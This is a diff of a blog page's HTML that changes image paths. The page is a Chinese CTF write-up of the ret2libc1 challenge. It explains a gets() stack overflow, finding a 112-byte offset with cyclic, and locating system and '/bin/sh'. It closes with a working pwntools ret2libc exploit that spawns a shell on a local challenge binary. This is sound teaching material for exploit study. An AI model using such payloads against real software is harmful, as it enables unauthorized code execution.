@@ -23,18 +23,18 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="基本ROP&#x2F;cyclic计算地址偏移&#x2F;ROPgadget&#x2F;有&#39;&#x2F;bin&#x2F;sh&#39;情况下的系统调用&#x2F;32位程序">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/1.png">
-<meta property="og:image" content="http://example.com/2.png">
-<meta property="og:image" content="http://example.com/3.png">
-<meta property="og:image" content="http://example.com/4.png">
-<meta property="og:image" content="http://example.com/5.png">
-<meta property="og:image" content="http://example.com/6.png">
-<meta property="og:image" content="http://example.com/7.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/1.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/2.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/3.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/4.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/5.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/6.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2libc1/7.png">
 <meta property="article:published_time" content="2021-03-10T13:50:36.000Z">
 <meta property="article:modified_time" content="2021-03-14T12:15:06.852Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/1.png">
+<meta name="twitter:image" content="http://example.com/2021/03/10/ret2libc1/1.png">
   
   
   
@@ -285,19 +285,19 @@
                 
                 <p>知识点：基本ROP&#x2F;cyclic计算地址偏移&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’与call _system情况下的系统调用</p>
 <p>先checksec</p>
-<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>是32位程序，开启了栈堆不可执行保护，打开ida</p>
-<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>gets函数存在栈溢出，用cyclic计算偏移地址。</p>
 <p>首先生成一个比较大的cyclic值。</p>
-<p><img src="/3.png" srcset="/img/loading.gif" lazyload></p>
-<p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/2021/03/10/ret2libc1/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里的小箭头指向的就是要跳转的指令的地址，因为填充的数据不可跳转，就停在了这里，这里的0x62616164就是我们填充进去的cyclic中的某一小段，我们找到这一小段在cyclic中的地址，就可以算出需要填充多少垃圾数据，即劫持返回地址的偏移量。</p>
-<p><img src="/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/5.png" srcset="/img/loading.gif" lazyload></p>
 <p>因此我们需要填充112个垃圾数据。</p>
 <p>接下来寻找反汇编程序中是否含有&#x2F;bin&#x2F;sh与system函数</p>
-<p><img src="/6.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2libc1/7.png" srcset="/img/loading.gif" lazyload></p>
 <p>那么有了system和&#x2F;bin&#x2F;sh就可以写exp了，这一题跟系统调用不一样，本题是直接使用call system函数，&#x2F;bin&#x2F;sh应该放在栈中作为函数参数，但是系统调用需要把参数放入寄存器中，以int 80h作为函数参数。</p>
 <p>exp</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048720</span><br><span class="hljs-variable">system</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048460</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;RET2LIBC &gt;_&lt;\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>)</span><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br><br></code></pre></td></tr></table></figure>
